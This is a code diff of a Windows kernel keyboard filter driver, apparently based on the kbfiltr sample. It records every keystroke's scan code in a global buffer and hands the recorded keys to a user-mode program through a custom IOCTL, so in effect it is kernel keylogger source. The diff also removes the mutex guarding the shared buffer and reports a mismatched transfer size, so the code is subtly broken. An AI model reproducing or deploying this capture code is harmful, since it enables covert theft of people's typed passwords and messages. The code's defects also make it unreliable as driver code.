@@ -45,55 +45,29 @@ Environment:
 #pragma alloc_text (PAGE, KbFilter_EvtIoInternalDeviceControl)
 #endif
 
-UCHAR KeyBuffer[MAX_KEY_BUFFER];
-ULONG KeyBufferIndex = 0;
-FAST_MUTEX KeyBufferMutex;
+#define BUFFER_SIZE 128
+
+typedef struct _KEY_BUFFER {
+    UCHAR ScanCodes[BUFFER_SIZE];
+    ULONG Count;
+} KEY_BUFFER;
+
+static KEY_BUFFER g_KeyBuffer; // Global buffer to store key presses
 
 VOID InitializeKeyBuffer() 
 {
     DebugPrint(("Initializing key buffer...\n"));
-    RtlZeroMemory(KeyBuffer, sizeof(KeyBuffer));
-    KeyBufferIndex = 0;
-    ExInitializeFastMutex(&KeyBufferMutex);
+    RtlZeroMemory(&g_KeyBuffer, sizeof(KEY_BUFFER));
 }
 
 VOID AddKeyToBuffer(
-    UCHAR key
+    UCHAR ScanCode
 ) 
 {
-    ExAcquireFastMutex(&KeyBufferMutex);
-    DebugPrint(("Adding key to buffer: 0x%X.\n", key));
-    KeyBuffer[KeyBufferIndex] = key;
-    KeyBufferIndex = ++KeyBufferIndex % MAX_KEY_BUFFER;
-    ExReleaseFastMutex(&KeyBufferMutex);
-}
-
-VOID CopyKeyBufferToUserSpace(
-    IN WDFREQUEST Request,
-    IN size_t OutputBufferLength
-)
-{
-    PVOID outputBuffer = NULL;
-    NTSTATUS status;
-
-    status = WdfRequestRetrieveOutputBuffer(Request, 0, &outputBuffer, &OutputBufferLength);
-
-    if (NT_SUCCESS(status)) {
-        if (OutputBufferLength >= sizeof(KeyBuffer)) {
-            DebugPrint(("Trying to copy memory in IOCTL_DISPATCH_KEYBOARD_IO...\n"));
-            RtlCopyMemory(outputBuffer, KeyBuffer, sizeof(KeyBuffer));
-            WdfRequestComplete(Request, STATUS_SUCCESS);
-        }
-        else {
-            DebugPrint(("Buffer too small in IOCTL_DISPATCH_KEYBOARD_IO.\n"));
-            WdfRequestComplete(Request, STATUS_BUFFER_TOO_SMALL);
-        }
+    if (g_KeyBuffer.Count < BUFFER_SIZE) {
+        g_KeyBuffer.ScanCodes[g_KeyBuffer.Count] = ScanCode;
+        g_KeyBuffer.Count++;
     }
-    else {
-        DebugPrint(("Failed to retrieve output buffer.\n"));
-        WdfRequestComplete(Request, status);
-    }
-
 }
 
 ULONG InstanceNo = 0;
@@ -376,7 +350,28 @@ Return Value:
 
         bytesTransferred = sizeof(KEYBOARD_ATTRIBUTES);
         
-        break;    
+        break;   
+    case IOCTL_DISPATCH_KEYBOARD_IO:
+        DebugPrint(("Received IOCTL_DISPATCH_KEYBOARD_IO\n"));
+
+        status = WdfRequestRetrieveOutputMemory(Request, &outputMemory);
+        if (!NT_SUCCESS(status)) {
+            DebugPrint(("WdfRequestRetrieveOutputMemory failed %x\n", status));
+            break;
+        }
+
+        status = WdfMemoryCopyFromBuffer(outputMemory, 0, &g_KeyBuffer, sizeof(KEY_BUFFER));
+        if (!NT_SUCCESS(status)) {
+            DebugPrint(("WdfMemoryCopyFromBuffer failed %x\n", status));
+            break;
+        }
+
+        bytesTransferred = sizeof(KEYBOARD_ATTRIBUTES);
+
+		RtlZeroMemory(&g_KeyBuffer, sizeof(KEY_BUFFER));
+
+        break;
+
     default:
         status = STATUS_NOT_IMPLEMENTED;
         break;
@@ -592,14 +587,6 @@ Return Value:
     case IOCTL_KEYBOARD_SET_INDICATORS:
     case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
     case IOCTL_KEYBOARD_SET_TYPEMATIC:
-        break;
-    case IOCTL_DISPATCH_KEYBOARD_IO:
-        DebugPrint(("Received IOCTL_DISPATCH_KEYBOARD_IO\n"));
-
-        ExAcquireFastMutex(&KeyBufferMutex);
-        CopyKeyBufferToUserSpace(Request, OutputBufferLength);
-        ExReleaseFastMutex(&KeyBufferMutex);
-
         break;
     }
 
@@ -820,7 +807,9 @@ Return Value:
     }
 
     if (DataByte != NULL && *DataByte != 0) {
-        AddKeyToBuffer(*DataByte);
+        if (*DataByte < 0x81 && *DataByte != 0x00) {
+            AddKeyToBuffer(*DataByte);
+        }
     }
 
     *ContinueProcessing = TRUE;
